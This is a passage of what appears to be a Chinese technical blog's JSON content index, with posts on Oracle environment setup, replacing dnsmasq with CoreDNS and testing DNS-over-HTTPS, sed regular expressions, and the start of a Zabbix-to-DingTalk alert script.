class=\"o\"\u003e=\u003c/span\u003e/data/u01/app/oracle/product/18.3.0/dbhome_1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eORACLE_SID\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eoradb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/sbin:\u003cspan class=\"nv\"\u003e$PATH\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ORACLE_HOME\u003c/span\u003e/bin:\u003cspan class=\"nv\"\u003e$PATH\u003c/span\u003e:/usr/local/bin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eLD_LIBRARY_PATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ORACLE_HOME\u003c/span\u003e/lib:/lib:/usr/lib:\u003cspan class=\"nv\"\u003e$ORACLE_HOME\u003c/span\u003e/rdbms/lib\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eCLASSPATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ORACLE_HOME\u003c/span\u003e/JRE:\u003cspan class=\"nv\"\u003e$ORACLE_HOME\u003c/span\u003e/jlib:\u003cspan class=\"nv\"\u003e$ORACLE_HOME\u003c/span\u003e/rdbms/jlib\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eNLS_DATE_FORMAT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;yyyy/mm/dd hh24:mi:ss\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eEDITOR\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003evi\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eumask\u003c/span\u003e \u003cspan class=\"m\"\u003e022\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这个 del_log.sh 的脚本放进 oracle 用户的 crontab 里执行就好\u003c/p\u003e","title":"Oracle使用rman定时清除7天前的日志"},{"content":"CoreDNS是k8s的御用DNS解析软件\n支持很多插件，各种DoH、DoT、gRPC ，各种特性，安装配置也十分简单\n替代dnsmasq后，基本dnsmasq的功能都支持，修改劫持域名后也不用重启，会自动刷文件更新\n下面说一下装法：\n安装：\nwget https://github.com/coredns/coredns/releases/download/v1.7.0/coredns_1.7.0_linux_amd64.tgz\r解压后就一个文件，直接放到/usr/local/bin\n做个systemd启动文件\ncat /etc/systemd/system/coredns.service [Unit] Description=CoreDNS DNS server After=network.target [Service] PermissionsStartOnly=true LimitNOFILE=1048576 LimitNPROC=512 CapabilityBoundingSet=CAP_NET_BIND_SERVICE AmbientCapabilities=CAP_NET_BIND_SERVICE NoNewPrivileges=true ExecStart=/usr/local/bin/coredns -conf=/usr/local/bin/coredns.conf ExecReload=/bin/kill -SIGUSR1 $MAINPID Restart=on-failure [Install] WantedBy=multi-user.target 东西全都在/usr/local/bin/coredns.conf配置文件里：\n.:5353 https://.:443 { any log debug bind 172.18.30.1 tls /usr/local/bin/full.pem /usr/local/bin/key.pem hosts /etc/hosts { ttl 60 reload 1m no_reverse fallthrough } cache 120 reload 6s loadbalance forward . 114.114.114.114:53 223.5.5.5:53 223.6.6.6:53 { policy sequential } prometheus 172.18.30.1:9253 } 解释一下：\n. 表示所有域名，.:5353 和 https://.:443 表示开了5353和443端口来服务所有域名的查询 bind 172.18.30.1 绑定指定ip tls full.pem和key.pem是lego生成的*.rendoumi.com的证书链和私钥 hosts 表示从文件解析，reload 1m会自动扫描文件变动并加载 最有用的是fallthrough ，如果在/etc/hosts 找不到记录，那就继续，去下面的配置里找 loadbalance 表示如果查到的记录有多条，那就按round-robin轮询返回结果 forward 这里指定上游服务器，最多可以有15个上游 policy是严格按顺序来，首先114，114坏了5.5.5，5.5.5坏了6.6.6，如果不指定会从upstream里随机 挑一个 prometheus 露出端口，供prometheus刮数据用 然后启动，就可以了，这里为了避免跟dnsmasq冲突，用了5353，实际应该是53端口\nsystemctl start coredns\r测一下标准的dns查询\ndig -t a m.ddky.com @172.18.30.1 -p5353\r下面来解释DoH，DNS-Over-HTTPS，这个特性非常鬼畜 注意，准确的说https提交的是dns-message\n先测一下CF\ncurl -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?name=m.ddky.com\u0026amp;type=A' | jq .\rjson的结果很华丽，但是请注意，上面实际发的是dns-json，coredns不支持，鬼畜吧！\nDoH实际提交的是dns-message：\ncurl -H 'accept: application/dns-message' -v 'https://dns.ddky.com/dns-query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB' | hexdump\rcurl -H 'accept: application/dns-message' -v 'https://cloudflare-dns.com/dns-query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB' | hexdump\r注意那串dns=的字符串，那是个实际的查询，被Base64加码了，但绝不是对 name=www.example.com\u0026amp;type=A 这样简单的base64，这个东西完全无法造出来，有二进制的东西在里面。\n所以我们必须用程序来了，必须下载一个土造的DoH的客户端\nwget https://github.com/ameshkov/dnslookup/releases/download/v1.3.0/dnslookup-linux-amd64-v1.3.0.tar.gz\r解压出来一个dnslookup，用这个来查才行\n./dnslookup www.ddky.com https://dns.ddky.com/dns-query\r./dnslookup www.ddky.com https://dns.alidns.com/dns-query\r这样就ok了，最后补充一下，如果你非要用curl做DoH，也行，得下载最新版本的curl\ncurl -v --doh-url https://cloudflare-dns.com/dns-query https://m.ddky.com\r看过程，是先去CF查了DNS，然后又发了个请求到m.ddky.com\n","permalink":"https://rendoumi.com/posts/20221207-cordns_dnsmasq/","summary":"\u003cp\u003eCoreDNS是k8s的御用DNS解析软件\u003c/p\u003e\n\u003cp\u003e支持很多插件，各种DoH、DoT、gRPC ，各种特性，安装配置也十分简单\u003c/p\u003e\n\u003cp\u003e替代dnsmasq后，基本dnsmasq的功能都支持，修改劫持域名后也不用重启，会自动刷文件更新\u003c/p\u003e\n\u003cp\u003e下面说一下装法：\u003c/p\u003e\n\u003cp\u003e安装：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ewget https://github.com/coredns/coredns/releases/download/v1.7.0/coredns_1.7.0_linux_amd64.tgz\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e解压后就一个文件，直接放到/usr/local/bin\u003c/p\u003e\n\u003cp\u003e做个systemd启动文件\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/systemd/system/coredns.service \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eUnit\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDescription\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eCoreDNS DNS server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAfter\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003enetwork.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eService\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ePermissionsStartOnly\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eLimitNOFILE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1048576\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eLimitNPROC\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e512\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eCapabilityBoundingSet\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eCAP_NET_BIND_SERVICE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAmbientCapabilities\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eCAP_NET_BIND_SERVICE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eNoNewPrivileges\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eExecStart\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/local/bin/coredns -conf\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/local/bin/coredns.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eExecReload\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/bin/kill -SIGUSR1 \u003cspan class=\"nv\"\u003e$MAINPID\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eRestart\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eon-failure\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eInstall\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eWantedBy\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003emulti-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e东西全都在/usr/local/bin/coredns.conf配置文件里：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e.:5353 https://.:443 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  any\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  debug\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nb\"\u003ebind\u003c/span\u003e 172.18.30.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  tls /usr/local/bin/full.pem /usr/local/bin/key.pem\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  hosts /etc/hosts \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ttl \u003cspan class=\"m\"\u003e60\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    reload 1m\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    no_reverse\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    fallthrough\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  cache \u003cspan class=\"m\"\u003e120\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  reload 6s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  loadbalance\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  forward . 114.114.114.114:53 223.5.5.5:53 223.6.6.6:53 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      policy sequential\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  prometheus 172.18.30.1:9253\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e解释一下：\u003c/p\u003e","title":"CoreDNS替代dnsmasq"},{"content":"之前说过sed的高阶用法，其实普通情况下，正则是最常用的，下面就来说一下，用不到的就暂时不说\n^ # 匹配行开始，如：/^sed/匹配所有以sed开头的行。 $ # 匹配行结束，如：/sed$/匹配所有以sed结尾的行。 . # 匹配一个非换行符的任意字符，如：/s.d/匹配s后接一个任意字符，最后是d。 * # 匹配0个或多次字符，如：/a*sed/匹配所有模板是0个或多个a后紧跟sed的行。后紧跟sed的行。 \\? # 匹配0次或1次他前面的字符 \\+ # 匹配1次或多次他前面的字符，如：空格\\+ 或 “\\+“匹配至少一个或多个空格 | #管道符号用来匹配两边任意一个子表达式，如：\u0026#39;/101\\|102/p\u0026#39; 匹配包含101或者102的行打印 [] # 匹配一个指定范围内的字符，如/[sS]ed/匹配sed和Sed。 [^] # 匹配一个不在指定范围内的字符，如：/[^A-RT-Z]ed/匹配不包含A-R和T-Z的一个字母开头，紧跟ed的行。 \\(..\\) # 匹配子串，保存匹配的字符，如s/\\(love\\)able/\\1rs，loveable被替换成lovers。 \u0026amp; # 保存搜索字符用来替换其他字符，如s/love/ **\u0026amp;** /，love这成 **love** 。 \\\u0026lt; # 匹配单词的开始，如:/\\\u0026lt;love/匹配包含以love开头的单词的行。 \\\u0026gt; # 匹配单词的结束，如/love\\\u0026gt;/匹配包含以love结尾的单词的行。 \\{m\\} # 重复字符x，m次，如：/0\\{5\\}/匹配包含5个0的行。 \\{m,\\} # 重复字符x，至少m次，如：/0\\{5,\\}/匹配至少有5个0的行。 \\{m,n\\} # 重复字符x，至少m次，不多于n次，如：/0\\{5,10\\}/匹配5~10个0的行。 例子很多:\n用户名，后面跟1个或者多个空格，再跟密码；更换成用户名 密码 MAC地址\nsed -i \u0026#34;s/${username} \\+${password}$/${username} ${password} ${IV_HWADDR}/\u0026#34; ${PASSFILE} 跟 shell 脚本的参数一起记比较好：\n$0 脚本本身的名字 $1 传递给该shell脚本的第1个参数 $2 传递给该shell脚本的第2个参数 $@ 传给脚本的所有参数的列表 $# 传给脚本的参数个数 $* 以一个单字符串显示所有向脚本传递的参数，与位置变量不同，\u0026gt;参数可超过9个 $$ 脚本运行的当前进程ID号 $? 命令执行结果反馈，0表示执行成功，其余数字表示执行不成功。 还有一个重要的地方，sed 使用 -i 对文件进行修改时，执行者需要有对文件目录的写权限，因为sed实际是产生了一个临时文件，然后再挪回去得！！！！\n","permalink":"https://rendoumi.com/posts/20221207-sed_regex/","summary":"\u003cp\u003e之前说过sed的高阶用法，其实普通情况下，正则是最常用的，下面就来说一下，用不到的就暂时不说\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e^ \u003cspan class=\"c1\"\u003e# 匹配行开始，如：/^sed/匹配所有以sed开头的行。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ \u003cspan class=\"c1\"\u003e# 匹配行结束，如：/sed$/匹配所有以sed结尾的行。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e. \u003cspan class=\"c1\"\u003e# 匹配一个非换行符的任意字符，如：/s.d/匹配s后接一个任意字符，最后是d。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e* \u003cspan class=\"c1\"\u003e# 匹配0个或多次字符，如：/a*sed/匹配所有模板是0个或多个a后紧跟sed的行。后紧跟sed的行。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\?\u003c/span\u003e \u003cspan class=\"c1\"\u003e# 匹配0次或1次他前面的字符\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\+\u003c/span\u003e \u003cspan class=\"c1\"\u003e# 匹配1次或多次他前面的字符，如：空格\\+ 或 “\\+“匹配至少一个或多个空格\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"c1\"\u003e#管道符号用来匹配两边任意一个子表达式，如：\u0026#39;/101\\|102/p\u0026#39; 匹配包含101或者102的行打印\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"c1\"\u003e# 匹配一个指定范围内的字符，如/[sS]ed/匹配sed和Sed。  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e^\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"c1\"\u003e# 匹配一个不在指定范围内的字符，如：/[^A-RT-Z]ed/匹配不包含A-R和T-Z的一个字母开头，紧跟ed的行。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\(\u003c/span\u003e..\u003cspan class=\"se\"\u003e\\)\u003c/span\u003e \u003cspan class=\"c1\"\u003e# 匹配子串，保存匹配的字符，如s/\\(love\\)able/\\1rs，loveable被替换成lovers。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# 保存搜索字符用来替换其他字符，如s/love/ **\u0026amp;** /，love这成 **love** 。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\\u0026lt;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# 匹配单词的开始，如:/\\\u0026lt;love/匹配包含以love开头的单词的行。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\\u0026gt;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# 匹配单词的结束，如/love\\\u0026gt;/匹配包含以love结尾的单词的行。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\{\u003c/span\u003em\u003cspan class=\"se\"\u003e\\}\u003c/span\u003e \u003cspan class=\"c1\"\u003e# 重复字符x，m次，如：/0\\{5\\}/匹配包含5个0的行。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\{\u003c/span\u003em,\u003cspan class=\"se\"\u003e\\}\u003c/span\u003e \u003cspan class=\"c1\"\u003e# 重复字符x，至少m次，如：/0\\{5,\\}/匹配至少有5个0的行。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\{\u003c/span\u003em,n\u003cspan class=\"se\"\u003e\\}\u003c/span\u003e \u003cspan class=\"c1\"\u003e# 重复字符x，至少m次，不多于n次，如：/0\\{5,10\\}/匹配5~10个0的行。  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e例子很多:\u003c/p\u003e\n\u003cp\u003e用户名，后面跟1个或者多个空格，再跟密码；更换成用户名 密码 MAC地址\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esed -i \u003cspan class=\"s2\"\u003e\u0026#34;s/\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eusername\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e \\+\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003epassword\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e$\u003cspan class=\"s2\"\u003e/\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eusername\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e \u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003epassword\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e \u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eIV_HWADDR\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e/\u0026#34;\u003c/span\u003e \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003ePASSFILE\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e跟 shell 脚本的参数一起记比较好：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$0\u003c/span\u003e 脚本本身的名字\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e 传递给该shell脚本的第1个参数\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$2\u003c/span\u003e 传递给该shell脚本的第2个参数\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$@\u003c/span\u003e 传给脚本的所有参数的列表\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$#\u003c/span\u003e 传给脚本的参数个数\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$*\u003c/span\u003e 以一个单字符串显示所有向脚本传递的参数，与位置变量不同，\u0026gt;参数可超过9个\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$$\u003c/span\u003e 脚本运行的当前进程ID号\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$?\u003c/span\u003e 命令执行结果反馈，0表示执行成功，其余数字表示执行不成功。\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e还有一个重要的地方，sed 使用 -i 对文件进行修改时，执行者需要有对文件目录的写权限，因为sed实际是产生了一个临时文件，然后再挪回去得！！！！\u003c/p\u003e","title":"sed中的正则表达式用法"},{"content":"zabbix 是很熟悉的东西，但是实际上博主已经跳过了这个东西，直接蹦到 Prometheus 去了\n但是，存在即合理，当下公司用的是这个，那么用就用吧，zabbix发到钉钉告警。\n那么我们也研究一下如何发到钉钉告警，而且好看一些\n原理：\n原理就是用 post 向钉钉机器人的 webhook 地址提交 Markdown 的 json 信息\n首先我们要建立个钉钉群，然后在群中添加一个群机器人，这里就会有两个选择，一个是这个机器人只接受特定的词语，二是向机器人发送消息的机器的ip是固定的。\n阿里云建议的是关键词：云监控、云服务、监控、Monitor、ECS、报警\n当然，这里更加建议IP，IP是死的，报警里带关键词意味着发送内容被部分固定了。\n如上，我们会得到一个钉钉机器人的Webhook地址：\nhttps://oapi.dingtalk.com/robot/send?access_token=xxxxxxxxxx 然后我们要准备一个发送的脚本，python很合适\n#!/usr/bin/env python #coding:utf-8 #zabbix钉钉报警 import requests,json,sys,os,datetime #说明：这里改为自己创建的机器人的webhook webhook=\u0026#34;https://oapi.dingtalk.com/robot/send?access_token=xxxxxx\u0026#34; def log(info): if os.path.isfile(\u0026#34;/tmp/dingding.log\u0026#34;) == False: f = open(log_file, \u0026#39;a+\u0026#39;) else: f = open(log_file,\u0026#39;w+\u0026#39;) f.write(info) f.close() def msg(text,user): json_text= { \u0026#34;msgtype\u0026#34;: \u0026#34;markdown\u0026#34;, \u0026#34;markdown\u0026#34;: { \u0026#34;title\u0026#34;: \u0026#34;zabbix monitor\u0026#34;, \u0026#34;text\u0026#34;: text }, \u0026#34;at\u0026#34;: { \u0026#34;atMobiles\u0026#34;: [ user ], 